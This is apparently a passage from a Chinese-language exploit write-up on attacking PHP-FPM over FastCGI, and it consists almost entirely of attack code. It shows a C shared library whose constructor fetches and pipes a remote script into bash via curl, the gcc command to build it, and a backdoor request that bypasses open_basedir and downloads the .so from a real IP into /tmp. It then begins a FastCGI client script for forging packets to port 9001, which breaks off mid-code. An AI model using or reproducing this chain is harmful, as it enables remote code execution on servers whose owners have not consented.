+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br>__attribute__ ((__constructor__)) <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">preload</span> <span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;<br>    system(<span class="hljs-string">&quot;bash -c &#x27;curl http://x.x.x.x/qwzf|bash&#x27;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>编译</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">gcc</span> <span class="hljs-selector-tag">hpdoger</span><span class="hljs-selector-class">.c</span> <span class="hljs-selector-tag">-fPIC</span> <span class="hljs-selector-tag">-shared</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">hpdoger</span><span class="hljs-selector-class">.so</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>上传生成的so文件到目标的/tmp目录</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">/add_api.php?backdoor=<span class="hljs-keyword">mkdir</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;a&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);copy(<span class="hljs-string">&#x27;http://118.195.166.138/hpdoger.so&#x27;</span>,<span class="hljs-string">&#x27;/tmp/hpdoger.so&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+
+
+<p>运行脚本得到payload，也就是发送给9001端口的伪造好的FastCGI数据</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Note : Code is released under the GNU LGPL</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Please do not change the header of this file</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span><br><span class="hljs-comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span><br><span class="hljs-comment"> * the License, or (at your option) any later version.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span><br><span class="hljs-comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * See the GNU Lesser General Public License for more details.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Handles communication with a FastCGI application</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="hljs-doctag">@webstart</span>.fr&gt;</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span>     1.0</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FCGIClient</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">const</span> VERSION_1            = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> BEGIN_REQUEST        = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> ABORT_REQUEST        = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">const</span> END_REQUEST          = <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">const</span> PARAMS               = <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">const</span> STDIN                = <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">const</span> STDOUT               = <span class="hljs-number">6</span>;<br>    <span class="hljs-keyword">const</span> STDERR               = <span class="hljs-number">7</span>;<br>    <span class="hljs-keyword">const</span> DATA                 = <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">const</span> GET_VALUES           = <span class="hljs-number">9</span>;<br>    <span class="hljs-keyword">const</span> GET_VALUES_RESULT    = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">const</span> UNKNOWN_TYPE         = <span class="hljs-number">11</span>;<br>    <span class="hljs-keyword">const</span> MAXTYPE              = <span class="hljs-built_in">self</span>::UNKNOWN_TYPE;<br>    <span class="hljs-keyword">const</span> RESPONDER            = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> AUTHORIZER           = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">const</span> FILTER               = <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">const</span> REQUEST_COMPLETE     = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">const</span> CANT_MPX_CONN        = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> OVERLOADED           = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">const</span> UNKNOWN_ROLE         = <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">const</span> MAX_CONNS            = <span class="hljs-string">&#x27;MAX_CONNS&#x27;</span>;<br>    <span class="hljs-keyword">const</span> MAX_REQS             = <span class="hljs-string">&#x27;MAX_REQS&#x27;</span>;<br>    <span class="hljs-keyword">const</span> MPXS_CONNS           = <span class="hljs-string">&#x27;MPXS_CONNS&#x27;</span>;<br>    <span class="hljs-keyword">const</span> HEADER_LEN           = <span class="hljs-number">8</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Socket</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> Resource</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_sock</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Host</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> String</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_host</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Port</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> Integer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_port</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Keep Alive</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> Boolean</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_keepAlive</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Constructor</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $host Host of the FastCGI application</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> Integer $port Port of the FastCGI application</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>, <span class="hljs-variable">$port</span> = <span class="hljs-number">9001</span></span>) // <span class="hljs-title">and</span> <span class="hljs-title">default</span> <span class="hljs-title">value</span> <span class="hljs-title">for</span> <span class="hljs-title">port</span>, <span class="hljs-title">just</span> <span class="hljs-title">for</span> <span class="hljs-title">unixdomain</span> <span class="hljs-title">socket</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_host = <span class="hljs-variable">$host</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_port = <span class="hljs-variable">$port</span>;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Define whether or not the FastCGI application should keep the connection</span><br><span class="hljs-comment">     * alive at the end of a request</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setKeepAlive</span>(<span class="hljs-params"><span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_keepAlive = (<span class="hljs-keyword">boolean</span>)<span class="hljs-variable">$b</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;_keepAlive &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;_sock) &#123;<br>            fclose(<span class="hljs-keyword">$this</span>-&gt;_sock);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Get the keep alive status</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getKeepAlive</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;_keepAlive;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Create a connection to the FastCGI application</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;_sock) &#123;<br>            <span class="hljs-comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span><br>            <span class="hljs-keyword">$this</span>-&gt;_sock = stream_socket_client(<span class="hljs-keyword">$this</span>-&gt;_host, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">5</span>);<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;_sock) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;Unable to connect to FastCGI application&#x27;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Build a FastCGI packet</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> Integer $type Type of the packet</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $content Content of the packet</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> Integer $requestId RequestId</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildPacket</span>(<span class="hljs-params"><span class="hljs-variable">$type</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$requestId</span> = <span class="hljs-number">1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$clen</span> = strlen(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">return</span> chr(<span class="hljs-built_in">self</span>::VERSION_1)         <span class="hljs-comment">/* version */</span><br>            . chr(<span class="hljs-variable">$type</span>)                    <span class="hljs-comment">/* type */</span><br>            . chr((<span class="hljs-variable">$requestId</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-comment">/* requestIdB1 */</span><br>            . chr(<span class="hljs-variable">$requestId</span> &amp; <span class="hljs-number">0xFF</span>)        <span class="hljs-comment">/* requestIdB0 */</span><br>            . chr((<span class="hljs-variable">$clen</span> &gt;&gt; <span class="hljs-number">8</span> ) &amp; <span class="hljs-number">0xFF</span>)     <span class="hljs-comment">/* contentLengthB1 */</span><br>            . chr(<span class="hljs-variable">$clen</span> &amp; <span class="hljs-number">0xFF</span>)             <span class="hljs-comment">/* contentLengthB0 */</span><br>            . chr(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* paddingLength */</span><br>            . chr(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* reserved */</span><br>            . <span class="hljs-variable">$content</span>;                     <span class="hljs-comment">/* content */</span><br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Build an FastCGI Name value pair</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $name Name</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $value Value</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> String FastCGI Name value pair</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildNvpair</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$nlen</span> = strlen(<span class="hljs-variable">$name</span>);<br>        <span class="hljs-variable">$vlen</span> = strlen(<span class="hljs-variable">$value</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$nlen</span> &lt; <span class="hljs-number">128</span>) &#123;<br>            <span class="hljs-comment">/* nameLengthB0 */</span><br>            <span class="hljs-variable">$nvpair</span> = chr(<span class="hljs-variable">$nlen</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span><br>            <span class="hljs-variable">$nvpair</span> = chr((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) . chr((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . chr((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . chr(<span class="hljs-variable">$nlen</span> &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$vlen</span> &lt; <span class="hljs-number">128</span>) &#123;<br>            <span class="hljs-comment">/* valueLengthB0 */</span><br>            <span class="hljs-variable">$nvpair</span> .= chr(<span class="hljs-variable">$vlen</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span><br>            <span class="hljs-variable">$nvpair</span> .= chr((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) . chr((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . chr((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . chr(<span class="hljs-variable">$vlen</span> &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>        <span class="hljs-comment">/* nameData &amp; valueData */</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$nvpair</span> . <span class="hljs-variable">$name</span> . <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Read a set of FastCGI Name value pairs</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $data Data containing the set of FastCGI NVPair</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> array of NVPair</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readNvpair</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>, <span class="hljs-variable">$length</span> = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$length</span> === <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-variable">$length</span> = strlen(<span class="hljs-variable">$data</span>);<br>        &#125;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-variable">$p</span> != <span class="hljs-variable">$length</span>) &#123;<br>            <span class="hljs-variable">$nlen</span> = ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$nlen</span> &gt;= <span class="hljs-number">128</span>) &#123;<br>                <span class="hljs-variable">$nlen</span> = (<span class="hljs-variable">$nlen</span> &amp; <span class="hljs-number">0x7F</span> &lt;&lt; <span class="hljs-number">24</span>);<br>                <span class="hljs-variable">$nlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;) &lt;&lt; <span class="hljs-number">16</span>);<br>                <span class="hljs-variable">$nlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;) &lt;&lt; <span class="hljs-number">8</span>);<br>                <span class="hljs-variable">$nlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;));<br>            &#125;<br>            <span class="hljs-variable">$vlen</span> = ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$vlen</span> &gt;= <span class="hljs-number">128</span>) &#123;<br>                <span class="hljs-variable">$vlen</span> = (<span class="hljs-variable">$nlen</span> &amp; <span class="hljs-number">0x7F</span> &lt;&lt; <span class="hljs-number">24</span>);<br>                <span class="hljs-variable">$vlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;) &lt;&lt; <span class="hljs-number">16</span>);<br>                <span class="hljs-variable">$vlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;) &lt;&lt; <span class="hljs-number">8</span>);<br>                <span class="hljs-variable">$vlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;));<br>            &#125;<br>            <span class="hljs-variable">$array</span>[substr(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$nlen</span>)] = substr(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$p</span>+<span class="hljs-variable">$nlen</span>, <span class="hljs-variable">$vlen</span>);<br>            <span class="hljs-variable">$p</span> += (<span class="hljs-variable">$nlen</span> + <span class="hljs-variable">$vlen</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$array</span>;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Decode a FastCGI Packet</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $data String containing all the packet</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> array</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decodePacketHeader</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;version&#x27;</span>]       = ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">0</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;type&#x27;</span>]          = ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">1</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;requestId&#x27;</span>]     = (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">2</span>&#125;) &lt;&lt; <span class="hljs-number">8</span>) + ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">3</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;contentLength&#x27;</span>] = (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">4</span>&#125;) &lt;&lt; <span class="hljs-number">8</span>) + ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">5</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;paddingLength&#x27;</span>] = ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">6</span>&#125;);<br>        <span class="hljs-variable">$ret</span>[<span 